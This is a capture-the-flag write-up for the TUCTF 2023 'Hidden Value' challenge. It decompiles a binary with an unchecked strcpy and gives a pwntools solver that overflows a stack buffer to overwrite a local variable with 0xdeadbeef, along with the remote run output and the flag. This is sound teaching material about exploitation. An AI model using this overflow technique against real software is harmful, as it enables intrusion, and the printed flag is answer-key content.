# Hidden Value [298 Solves]

## Description

> There's a hidden value in this program, can you find it?
>
> `nc chal.tuctf.com 30011`
>
> Attachments: hidden-value

## Flag

TUCTF{pr4cti4l_buffer_overrun}

## Solution

```console
$ file hidden-value
hidden-value: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=54c8ec71703e58a595fc2f2d517fe1a393942512, for GNU/Linux 3.2.0, not stripped

$ checksec hidden-value
[*] '/root/ctf/TUCTF 2023/Pwn/Hidden Value/hidden-value'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Decompiled whith Ghidra.

main:

```c
undefined8 main(void)

{
  char local_78 [112];
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  printf("Enter your name: ");
  fgets(local_78,100,stdin);
  greet_user(local_78);
  return 0;
}
```

greet_user:

```c
void greet_user(char *param_1)

{
  char local_38 [44];
  int local_c;
  
  local_c = 0x12345678;
  strcpy(local_38,param_1);
  if (local_c == -0x21524111) {
    hidden_command();
  }
  else {
    printf("Hello, %s! Nothing special happened.\n",local_38);
  }
  return;
}
```

hidden_command:

```c
void hidden_command(void)

{
  char local_78 [104];
  FILE *local_10;
  
  puts("Congratulations! You have executed the hidden command.");
  local_10 = (FILE *)FUN_004010e0(&DAT_00402041,&DAT_0040203f);
  fgets(local_78,100,local_10);
  printf("The flag is: %s\n",local_78);
  return;
}
```

If you input over 44 characters, the greet_user function will store a value in local_c beyond local_38.

```python
>>> hex(0x100000000 + -0x21524111)
'0xdeadbeef'
```

local_c should be input as 0xdeadbeef.

```python
# solver.py
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./hidden-value", checksec=False)


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("chal.tuctf.com", 30011)

    elif args.GDB:
        gdbscript = """
        b greet_user
        c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = elf.process()

    return io


def main():
    io = conn()

    payload = b"A" * cyclic_find("laaa") + p64(0xDEADBEEF)

    io.sendlineafter(b"Enter your name:", payload)

    io.interactive("")


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py REMOTE
[+] Opening connection to chal.tuctf.com on port 30011: Done
[DEBUG] Received 0x11 bytes:
    b'Enter your name: '
[DEBUG] Sent 0x35 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  ef be ad de  │AAAA│AAAA│AAAA│····│
    00000030  00 00 00 00  0a                                     │····│·│
    00000035
[*] Switching to interactive mode
 [DEBUG] Received 0x37 bytes:
    b'Congratulations! You have executed the hidden command.\n'
Congratulations! You have executed the hidden command.
[DEBUG] Received 0x2c bytes:
    b'The flag is: TUCTF{pr4cti4l_buffer_overrun}\n'
The flag is: TUCTF{pr4cti4l_buffer_overrun}
[*] Got EOF while reading in interactive
```
